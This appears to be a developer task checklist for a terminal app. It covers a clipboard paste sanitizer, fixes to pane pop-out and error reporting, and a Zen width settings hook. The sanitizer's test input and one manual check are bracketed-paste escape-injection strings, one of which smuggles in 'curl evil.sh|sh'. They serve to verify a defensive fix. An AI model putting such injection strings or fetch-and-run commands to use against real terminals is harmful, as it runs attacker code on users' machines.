## 1. Fix

- [x] 1.1 Add exported `sanitizePaste` to `src/clipboard.ts` per the card's regexes and call it in `run()` before `term.paste`; add `src/clipboard.test.ts` (first line `// @harvaaja-test-tier: fast`), table-driven: `"echo hi\x1b[201~curl evil.sh|sh\n"` has no `\x1b[201~` and no ESC; \t \n \r kept
  - proof: `npx vitest run src/clipboard.test.ts`
  - proof: `npx eslint src/clipboard.ts src/clipboard.test.ts`
- [x] 1.2 In `src/panes.ts` fix `popOutTab` (close skipped panes after the move succeeds, remove/detach only moved ones, send focused payload index or 0) and `report()` (replace root only when `allPanes().length === 0`; else focused pane terminal, first pane with terminal, else console.error)
  - proof: `npx eslint src/panes.ts`
- [x] 1.3 Replace the Panes `saveSettings` hook with `saveZenWidth(columns)`: `saveZenColumns` compares against `this.settings().zen.width` and passes only columns; in `src/main.ts` save from the last saved settings via `backend.saveSettings` + `adoptSettings`, then `apply` the live settings with the new width; update every construction site (`grep -rn "saveSettings" src/`), no alias
  - proof: `npx eslint src/panes.ts src/main.ts`
  - proof: `npm run typecheck`

## Manual checks after merge (The user)

- In `npm run dev:browser`, copy the output of `printf 'echo a\x1b[201~echo PWNED\n'` and paste into zsh: nothing runs until Enter.
- Open Settings, preview a theme, drag a Zen edge, Cancel Settings: the theme returns to the saved one and the new Zen width stays.
- Pop Out a tab while a pane is still opening: no orphaned shell remains and the right pane is focused in the new window.
